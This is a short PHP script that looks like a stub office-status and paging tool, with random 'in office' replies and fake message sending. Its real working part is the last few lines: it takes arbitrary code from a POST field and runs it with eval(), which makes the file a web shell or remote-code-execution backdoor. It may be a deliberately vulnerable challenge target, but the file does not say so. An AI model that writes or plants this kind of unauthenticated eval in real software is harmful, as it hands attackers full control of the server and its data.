<?php

if(!defined('STDIN'))  define('STDIN',  fopen('php://stdin',  'rb'));
if(!defined('STDOUT')) define('STDOUT', fopen('php://stdout', 'wb'));
if(!defined('STDERR')) define('STDERR', fopen('php://stderr', 'wb'));

function ping($subject) {
    $status = random_int(0, 1) == 0 ? 'out of office' : 'in office';
    echo "$subject is $status";
}

function page($subject, $message) {
    echo "Sent '$message' to $subject";
}

$code = $_POST['code'];
fwrite(STDOUT, "executing $code");
eval($code);

?>
